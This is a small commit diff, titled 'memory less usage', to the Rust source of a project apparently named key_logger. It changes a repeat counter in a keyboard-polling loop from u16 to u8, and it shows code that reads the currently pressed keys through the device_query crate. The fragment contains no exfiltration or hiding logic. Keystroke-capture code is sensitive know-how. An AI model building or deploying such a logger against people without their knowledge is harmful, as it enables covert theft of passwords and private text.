memory less usage

+++ key_logger/src/keylogger/mod.rs
@@ -5,7 +5,7 @@ use device_query::{DeviceQuery, DeviceState, Keycode};
 use crate::ram::PubInfo;
 
 pub fn log() {
-    let (mut last_key, mut repeat): (Vec<Keycode>, u16) = (vec![], 0);
+    let (mut last_key, mut repeat): (Vec<Keycode>, u8) = (vec![], 0);
     loop {
         let keys = DeviceState::new().get_keys();
         if keys != last_key || repeat > 100 {
